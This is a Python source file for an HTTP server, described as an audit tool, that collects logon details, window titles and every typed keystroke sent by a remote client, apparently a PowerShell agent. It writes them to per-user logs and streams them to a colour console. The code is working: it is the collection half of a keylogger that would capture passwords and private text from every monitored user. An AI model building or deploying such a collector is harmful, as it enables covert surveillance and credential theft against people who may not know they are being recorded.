import json
import logging
import os
import re
import sys
import threading
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HOST    = "0.0.0.0"
PORT    = 8080
LOG_DIR = "logs"

os.makedirs(LOG_DIR, exist_ok=True)

# Serialize appends — the server is threaded, so concurrent writes to the
# same per-user log would otherwise interleave.
_log_lock = threading.Lock()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)

LOGON_FIELDS = [
    ("username",        "User",       "%-20s"),
    ("domain",          "Domain",     "%-15s"),
    ("hostname",        "Host",       "%-20s"),
    ("logon_server",    "DC",         "%-15s"),
    ("session_type",    "Session",    "%-8s"),
    ("rdp_client_name", "RDP Client", "%-20s"),
    ("rdp_client_ip",   "RDP IP",     "%-16s"),
    ("is_admin",        "Admin",      "%-6s"),
    ("ad_groups",       "Groups",     "%s"),
]


def user_log_path(username: str) -> str:
    date = datetime.now().strftime("%Y-%m-%d")
    safe = "".join(c if c.isalnum() or c in "-_" else "_" for c in username)
    return os.path.join(LOG_DIR, f"{safe}_{date}.log")


def write_user_log(username: str, line: str):
    with _log_lock:
        with open(user_log_path(username), "a", encoding="utf-8") as f:
            f.write(line + "\n")


# --------------------------------------------------------------------------
# Live console rendering — a color-highlighted stream that groups typed text
# under its window context so the window -> keystrokes relationship is visible.
# The durable audit still goes to the per-user files above; this is display only.
# --------------------------------------------------------------------------
class Ansi:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"


if os.name == "nt":
    os.system("")   # enable ANSI escape processing in modern Windows consoles

# Colour only for an interactive terminal; honour the NO_COLOR convention and a
# --no-color flag so piping to a file stays clean plain text.
USE_COLOR = (
    sys.stdout.isatty()
    and os.environ.get("NO_COLOR") is None
    and "--no-color" not in sys.argv
)

_console_lock = threading.Lock()
_last_window  = {}   # username -> window currently shown on the console (dedupes headers)
_TOKEN_RE     = re.compile(r"\[[A-Z0-9]+\]")   # [ENTER], [BACK], [TAB], ...


def _c(text: str, *codes: str) -> str:
    if not USE_COLOR or not codes:
        return text
    return "".join(codes) + text + Ansi.RESET


def _render_keys(s: str) -> str:
    """Typed characters in green; [SPECIAL] tokens dimmed so real text stands out."""
    out, i = [], 0
    for m in _TOKEN_RE.finditer(s):
        if m.start() > i:
            out.append(_c(s[i:m.start()], Ansi.GREEN))
        out.append(_c(m.group(), Ansi.DIM, Ansi.MAGENTA))
        i = m.end()
    if i < len(s):
        out.append(_c(s[i:], Ansi.GREEN))
    return "".join(out)


def _print_header(ts: str, user: str, icon: str, label: str, label_color: str):
    print(
        _c(f"\n┌─ {ts} ", Ansi.DIM)
        + _c(f" {user} ", Ansi.BOLD, Ansi.CYAN)
        + _c(f" {icon} ", Ansi.DIM)
        + _c(label, label_color)
    )


def console_logon(user: str, ts: str, summary: str):
    with _console_lock:
        _last_window.pop(user, None)   # next keystrokes will re-print their window header
        print(_c(f"\n══ {ts}  LOGON  {user}  ", Ansi.BOLD, Ansi.BLUE) + _c(summary, Ansi.DIM))


def console_window(user: str, process: str, title: str, ts: str):
    with _console_lock:
        _last_window[user] = title
        _print_header(ts, user, "⧉", f"{process}  {title}", Ansi.YELLOW)


def console_keystrokes(user: str, window: str, keystrokes: str, ts: str):
    with _console_lock:
        if _last_window.get(user) != window:
            _last_window[user] = window
            _print_header(ts, user, "▸", window or "(unknown window)", Ansi.YELLOW)
        print(_c("│ ", Ansi.DIM) + _render_keys(keystrokes))


def handle_logon(d):
    parts = []
    for key, label, fmt in LOGON_FIELDS:
        val = d.get(key)
        if val not in (None, "", False) or key == "is_admin":
            parts.append(f"{label}=" + (fmt % val))
    summary = "  ".join(parts)
    line = f"[{d.get('timestamp', '')}] LOGON         " + summary
    user = d.get("username", "unknown")
    console_logon(user, d.get("timestamp", ""), summary)
    write_user_log(user, line)


def handle_window_change(d):
    user    = d.get("username", "unknown")
    process = d.get("process")  or "unknown"   # null when Get-Process fails client-side
    title   = d.get("window_title", "")
    ts      = d.get("timestamp", "")
    line    = f"[{ts}] WINDOW_CHANGE  Process={process:<20s}  Title={title}"
    console_window(user, process, title, ts)
    write_user_log(user, line)


def handle_keystrokes(d):
    user       = d.get("username",   "unknown")
    window     = d.get("window")  or ""
    keystrokes = (d.get("keystrokes") or "").replace("\n", "[ENTER]").replace("\r", "")
    ts         = d.get("timestamp",  "")
    pid        = d.get("pid", "?")
    seq        = d.get("seq", "?")
    line       = f"[{ts}] KEYSTROKES    pid={pid} seq={seq}  Window={window}  Keys={keystrokes}"
    console_keystrokes(user, window, keystrokes, ts)
    write_user_log(user, line)


HANDLERS = {
    "logon":         handle_logon,
    "window_change": handle_window_change,
    "keystrokes":    handle_keystrokes,
}


class AuditHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length)

        try:
            # strict=False tolerates the raw control characters the client emits for
            # Ctrl-key combos (Ctrl+C -> 0x03, etc.), which its hand-rolled Escape()
            # does not encode. Without this, any Ctrl combo makes the whole keystroke
            # payload unparseable and it gets dropped.
            d          = json.loads(body.decode("utf-8", errors="replace"), strict=False)
            event_type = d.get("event_type", "unknown")
            handler    = HANDLERS.get(event_type)
            if handler:
                handler(d)
            else:
                logging.warning("Unknown event_type=%s  payload=%s", event_type, d)
        except json.JSONDecodeError:
            logging.warning("Malformed JSON payload: %s", body[:500])
        except Exception:
            # Never let a handler bug silently drop an event — surface it.
            logging.exception("Handler error for payload: %s", body[:500])
        finally:
            self.send_response(200)
            self.send_header("Content-Length", "0")
            self.end_headers()

    def log_message(self, *args):
        pass


if __name__ == "__main__":
    server = ThreadingHTTPServer((HOST, PORT), AuditHandler)
    logging.info("Listening on %s:%d  |  Writing logs to ./%s/", HOST, PORT, LOG_DIR)
    print(
        _c("Legend:  ", Ansi.DIM)
        + _c("user", Ansi.BOLD, Ansi.CYAN) + _c("  ▸/⧉ window", Ansi.YELLOW)
        + _c("  typed", Ansi.GREEN) + _c("  [SPECIAL]", Ansi.DIM, Ansi.MAGENTA)
        + _c("  LOGON", Ansi.BOLD, Ansi.BLUE)
    )
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logging.info("Stopped.")
